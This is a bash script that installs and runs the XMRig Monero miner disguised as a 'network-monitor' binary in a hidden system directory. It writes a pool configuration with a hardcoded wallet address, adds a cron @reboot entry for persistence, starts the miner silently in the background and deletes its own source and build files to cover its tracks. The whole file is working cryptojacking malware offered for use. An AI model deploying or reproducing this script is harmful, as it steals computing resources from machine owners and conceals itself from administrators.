#!/bin/bash
apt install sudo git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
mkdir -p /var/opt/network.d/
cd /var/opt/network.d
git clone https://github.com/xmrig/xmrig.git
cd xmrig/
cmake .
make -j$(nproc)
mv xmrig ../network-monitor
cd ..
printf '{
    "autosave": true,
    "donate-level": 1,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.minexmr.com:443",
            "user": "43XkD74xXNn1k74XYw31cHYjCRzJQzEJTQxSGiNNFtL5C5h5peq8dJaWwTiCAV6NWDaFPUZyGaRPFbVwNFqCkY6zAuBTW3o",
            "rig-id": "%s",
            "keepalive": true,
            "tls": true
        }
    ]
}' $(hostname) > config.json
chmod +x network-monitor
crontab -l > cron
echo "@reboot /var/opt/network.d/network-monitor" >> cron
crontab cron
rm cron
rm -rf xmrig/
sh -c "./network-monitor > /dev/null 2>&1 &"
rm /root/ubuntu.sh
